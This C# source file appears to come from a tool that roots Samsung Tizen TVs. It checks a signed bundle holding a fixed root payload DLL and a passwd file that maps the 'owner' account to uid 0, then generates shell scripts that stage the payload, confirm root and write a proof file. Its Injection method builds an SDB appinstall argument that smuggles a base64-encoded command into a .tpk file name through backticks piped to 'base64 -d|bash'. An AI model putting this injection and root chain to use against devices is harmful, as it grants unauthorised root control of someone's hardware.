using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace AeroTizen.UntetheredProbe
{
    internal sealed class Bundle
    {
        internal const string StagingRoot = "/home/owner/share/tmp/sdk_tools";
        internal const string Version = "0.0.12";
        internal readonly string DirectoryPath, Package, Nonce, Runtime;
        internal readonly byte[] ManifestBytes;
        internal readonly Dictionary<string, string> Hashes = new Dictionary<string, string>();
        internal readonly ServiceLaunch Service;
        internal string ProofOperation => Service == null ? "--run-proof" : "--run-service";
        internal string Stage => StagingRoot + "/" + Package;
        internal string Archive => Package + ".tar.gz";
        internal string ProofDirectory => StagingRoot + "/aerotizen-probe-proof-" + Nonce;
        internal string ProofPath => ProofDirectory + "/proof.json";
        internal string PayloadHash => Hashes["SamsungTvArchiveRoot.dll"];
        internal static string Digest(byte[] data)
        {
            using (var hash = SHA256.Create()) return BitConverter.ToString(hash.ComputeHash(data)).Replace("-", "").ToLowerInvariant();
        }
        internal static string Hex(int size)
        {
            var bytes = new byte[size];
            using (var random = RandomNumberGenerator.Create()) random.GetBytes(bytes);
            return BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
        }
        internal static byte[] ReadBounded(string path, int limit = 1024 * 1024)
        {
            var info = new FileInfo(path);
            if (!info.Exists || info.Length <= 0 || info.Length > limit
                || (info.Attributes & FileAttributes.ReparsePoint) != 0) throw new InvalidDataException("Invalid bundle file");
            using (var file = File.OpenRead(path))
            {
                var data = new byte[info.Length];
                int count = 0;
                while (count < data.Length)
                {
                    int received = file.Read(data, count, data.Length - count);
                    if (received == 0) throw new EndOfStreamException();
                    count += received;
                }
                if (file.ReadByte() != -1) throw new InvalidDataException("Bundle file changed while reading");
                return data;
            }
        }
        internal Bundle(string directory, bool allowService = false)
        {
            DirectoryPath = Path.GetFullPath(directory);
            ManifestBytes = ReadBounded(Path.Combine(DirectoryPath, "probe.json"), 16384);
            using (var document = JsonDocument.Parse(ManifestBytes))
            {
                JsonElement root = document.RootElement;
                if (root.GetProperty("schema_version").GetInt32() != 1
                    || root.GetProperty("upstream_version").GetString() != Version) throw new InvalidDataException("Unsupported bundle");
                Package = root.GetProperty("package").GetString(); Nonce = root.GetProperty("nonce").GetString();
                Runtime = root.GetProperty("runtime").GetString();
                if (root.TryGetProperty("service", out JsonElement service))
                {
                    if (!allowService) throw new InvalidDataException("Service launch is not permitted by the proof-only reader");
                    Service = new ServiceLaunch(service);
                }
                if (!Regex.IsMatch(Package ?? "", @"\Aarchive-root-[a-f0-9]{16}\z")
                    || !Regex.IsMatch(Nonce ?? "", @"\A[a-f0-9]{32}\z") || (Runtime != "3.1" && Runtime != "6.0"))
                    throw new InvalidDataException("Invalid probe identity");
                var names = new HashSet<string> {
                    "AeroTizenRootProbe.dll", "AeroTizenRootProbe.runtimeconfig.json", "AeroTizenRootProbe.deps.json",
                    "SamsungTvArchiveRoot.dll", "SamsungTvArchiveRoot.runtimeconfig.json", "SamsungTvArchiveRoot.deps.json",
                    "public.pem", "passwd", Archive, Archive + ".signature"
                };
                foreach (var property in root.GetProperty("files").EnumerateObject())
                {
                    if (!names.Remove(property.Name)) throw new InvalidDataException("Unexpected bundle file");
                    byte[] data = ReadBounded(Path.Combine(DirectoryPath, property.Name));
                    string hash = property.Value.GetProperty("sha256").GetString();
                    if (property.Value.GetProperty("size").GetInt32() != data.Length || Digest(data) != hash)
                        throw new InvalidDataException("Bundle file checksum mismatch: " + property.Name);
                    Hashes.Add(property.Name, hash);
                }
                if (names.Count != 0) throw new InvalidDataException("Incomplete bundle");
                string expected = Runtime == "6.0"
                    ? "5f647158f4c4fd502f1481c2692a95663516e934d11a13b45d5cd821d85d9671"
                    : "8c9c6380bfa6f3c6c73b4e31306f95d8bb389f8dd3a3d72dd75030e2251f8989";
                if (PayloadHash != expected) throw new InvalidDataException("Unverified upstream root payload");
                string expectedConfig = Runtime == "6.0"
                    ? "681a7f9dd3ecb637e2f1198c9cbd9d0e1b42994c211c64c8ffe2fba3f2c0442b"
                    : "818abac6065c8b3de67cdb136773c1e584705913877ab1f9961d8def7fdbc16d";
                string expectedDeps = Runtime == "6.0"
                    ? "fc0e154d1a440bbbc23cf6997f85a3d780667f1b324f88d922cda1b2ab52557e"
                    : "66c5c3188578f1f9521542475b63fa1a2a62e31c8c93bbc0e7fc8ac3102e9f03";
                if (Hashes["SamsungTvArchiveRoot.runtimeconfig.json"] != expectedConfig
                    || Hashes["SamsungTvArchiveRoot.deps.json"] != expectedDeps)
                    throw new InvalidDataException("Unverified upstream runtime files");
                if (Encoding.ASCII.GetString(ReadBounded(Path.Combine(DirectoryPath, "passwd")))
                    != "owner:x:0:0:owner:/home/owner:/bin/sh\n")
                    throw new InvalidDataException("Unexpected passwd bind view");
                VerifyArchive();
            }
        }
        internal string ExpectedProofScript()
        {
            string script = string.Join("\n", new[] {
                "#!/bin/sh", "set -eu", "umask 077", "test \"$(id -u)\" = 0", "test \"$(id -ru)\" = 0", "test \"$(id -g)\" = 0",
                "boot=$(cat /proc/sys/kernel/random/boot_id)", "case \"$boot\" in *[!a-f0-9-]*|'') exit 80;; esac",
                "proofdir=" + ProofDirectory, "test ! -e \"$proofdir\"", "test ! -L \"$proofdir\"",
                "mkdir -m 755 \"$proofdir\"", "chsmack -a _ \"$proofdir\"", "cd \"$proofdir\"", "proof=proof.json",
                "test ! -e \"$proof.new\"", "test ! -L \"$proof.new\"", "set -C",
                "printf '{\"schema_version\":1,\"uid\":0,\"euid\":0,\"gid\":0,\"boot_id\":\"%s\",\"nonce\":\"" + Nonce
                    + "\",\"payload_sha256\":\"" + PayloadHash + "\"}\\n' \"$boot\" > \"$proof.new\"",
                "set +C", "chmod 444 \"$proof.new\"", "chsmack -a _ \"$proof.new\"", "mv -f \"$proof.new\" \"$proof\"", ""
            });
            return script + (Service == null ? "" : Service.Script(Nonce));
        }
        private void VerifyArchive()
        {
            byte[] archive = ReadBounded(Path.Combine(DirectoryPath, Archive));
            byte[] signature = ReadBounded(Path.Combine(DirectoryPath, Archive + ".signature"));
            string pem = Encoding.ASCII.GetString(ReadBounded(Path.Combine(DirectoryPath, "public.pem")));
            byte[] publicKey = Convert.FromBase64String(pem.Replace("-----BEGIN PUBLIC KEY-----", "").Replace("-----END PUBLIC KEY-----", ""));
            using (var rsa = RSA.Create())
            {
                rsa.ImportSubjectPublicKeyInfo(publicKey, out int consumed);
                if (consumed != publicKey.Length || rsa.KeySize != 2048
                    || !rsa.VerifyData(archive, signature, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1))
                    throw new InvalidDataException("Invalid signed proof archive");
            }
            using (var input = new MemoryStream(archive))
            using (var gzip = new GZipStream(input, CompressionMode.Decompress))
            using (var output = new MemoryStream())
            {
                byte[] chunk = new byte[1024];
                int count;
                while ((count = gzip.Read(chunk, 0, chunk.Length)) > 0)
                {
                    if (output.Length + count > 32768) throw new InvalidDataException("Oversized proof archive");
                    output.Write(chunk, 0, count);
                }
                byte[] tar = output.ToArray();
                byte[] script = Encoding.ASCII.GetBytes(ExpectedProofScript());
                if (tar.Length < 512 + script.Length
                    || Encoding.ASCII.GetString(tar, 0, 100).TrimEnd('\0') != "launch.sh"
                    || (tar[156] != 0 && tar[156] != (byte)'0')
                    || Convert.ToInt32(Encoding.ASCII.GetString(tar, 124, 12).TrimEnd('\0', ' '), 8) != script.Length
                    || !tar.Skip(512).Take(script.Length).SequenceEqual(script)
                    || tar.Skip(512 + script.Length).Any(value => value != 0))
                    throw new InvalidDataException("Archive is not the fixed identity-only probe");
            }
        }
        internal static string Quote(string value) { return "'" + value.Replace("'", "'\\''") + "'"; }
        private static string Claim(string work)
        {
            if (!Regex.IsMatch(work ?? "", @"\A/tmp/aerotizen-root-probe-[a-f0-9]{16}\z"))
                throw new InvalidDataException("Invalid probe work directory");
            return work.Substring(work.Length - 16);
        }
        internal string Invocation(string work, string operation = "--run-payload")
        {
            if (operation != "--run-payload" && operation != "--run-proof" && operation != "--check" && operation != "--run-service")
                throw new InvalidDataException("Unknown SDK proof operation");
            if ((operation == "--run-service") != (Service != null) && operation != "--check")
                throw new InvalidDataException("Root operation does not match the signed service descriptor");
            string claim = Claim(work);
            var lines = new List<string> {
                "set -eu", "umask 077",
                "test ! -e " + Quote(Stage), "test ! -L " + Quote(Stage), "test ! -L " + Quote(StagingRoot + "/on-demand")
            };
            lines.Add("test ! -e " + Quote(ProofDirectory)); lines.Add("test ! -L " + Quote(ProofDirectory));
            foreach (string name in new[] { Archive, Archive + ".signature" })
            {
                string target = StagingRoot + "/on-demand/" + name;
                lines.Add("test ! -e " + Quote(target)); lines.Add("test ! -L " + Quote(target));
            }
            lines.Add("mkdir -m 755 " + Quote(Stage));
            lines.Add("printf '%s' " + Quote(claim) + " > " + Quote(Stage + "/probe-owner"));
            lines.Add("mkdir -p " + Quote(StagingRoot + "/on-demand"));
            foreach (string name in Hashes.Keys.Concat(new[] { "probe.json" }))
                lines.Add("cp " + Quote(work + "/" + name) + " " + Quote(Stage + "/" + name));
            foreach (string name in new[] { Archive, Archive + ".signature" })
            {
                string destination = StagingRoot + "/on-demand/" + name;
                lines.Add("test ! -e " + Quote(destination)); lines.Add("test ! -L " + Quote(destination));
                lines.Add("(set -C; cat " + Quote(work + "/" + name) + " > " + Quote(destination) + ")");
            }
            // Stock upstream accepts exactly one argument: the package identity.
            lines.Add("/usr/bin/dotnet " + Quote(Stage + "/AeroTizenRootProbe.dll") + " " + operation
                + (operation == "--check" ? "" : " " + Quote(claim)));
            lines.Add("printf '%s\\n' AEROTIZEN_PROBE_DONE");
            return string.Join("\n", lines) + "\n";
        }
        internal string Cleanup(string work)
        {
            string claim = Claim(work);
            string[] names = Hashes.Keys.Concat(new[] { "probe.json", "launcher.log", "probe-owner" }).ToArray();
            var lines = new List<string> { "set -eu", "test ! -L " + Quote(Stage) };
            lines.Add("if [ -d " + Quote(Stage) + " ]; then");
            lines.Add("test ! -L " + Quote(Stage + "/probe-owner"));
            lines.Add("test \"$(cat " + Quote(Stage + "/probe-owner") + ")\" = " + Quote(claim));
            lines.Add("test ! -L " + Quote(StagingRoot + "/on-demand"));
            foreach (string name in new[] { Archive, Archive + ".signature" })
            {
                string target = StagingRoot + "/on-demand/" + name;
                lines.Add("if [ -e " + Quote(target) + " ] || [ -L " + Quote(target) + " ]; then");
                lines.Add("test ! -L " + Quote(target));
                lines.Add("printf '%s  %s\\n' " + Quote(Hashes[name]) + " " + Quote(target) + " | sha256sum -c - >/dev/null");
                lines.Add("rm -f -- " + Quote(target)); lines.Add("fi");
            }
            lines.Add("rm -f -- " + string.Join(" ", names.Select(name => Quote(Stage + "/" + name))));
            lines.Add("rmdir " + Quote(Stage)); lines.Add("else");
            foreach (string name in new[] { Archive, Archive + ".signature" })
            {
                string target = StagingRoot + "/on-demand/" + name;
                lines.Add("test ! -e " + Quote(target)); lines.Add("test ! -L " + Quote(target));
            }
            lines.Add("fi");
            lines.Add("printf '%s\\n' AEROTIZEN_PROBE_CLEANED");
            return string.Join("\n", lines) + "\n";
        }
        internal static string Injection(string command, string gate)
        {
            if (!Regex.IsMatch(gate ?? "", @"\A[a-f0-9]{16}\z")) throw new InvalidDataException("Invalid injection gate");
            string path = "/tmp/s-" + gate;
            string wrapped = "/bin/mkdir " + path + " 2>/dev/null&&{ trap 'rmdir " + path + "' EXIT; " + command + ";}";
            string encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
            string value = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk";
            if (Encoding.ASCII.GetByteCount(value) > 510) throw new InvalidDataException("SDB injection exceeds the upstream limit");
            return value;
        }
    }

}
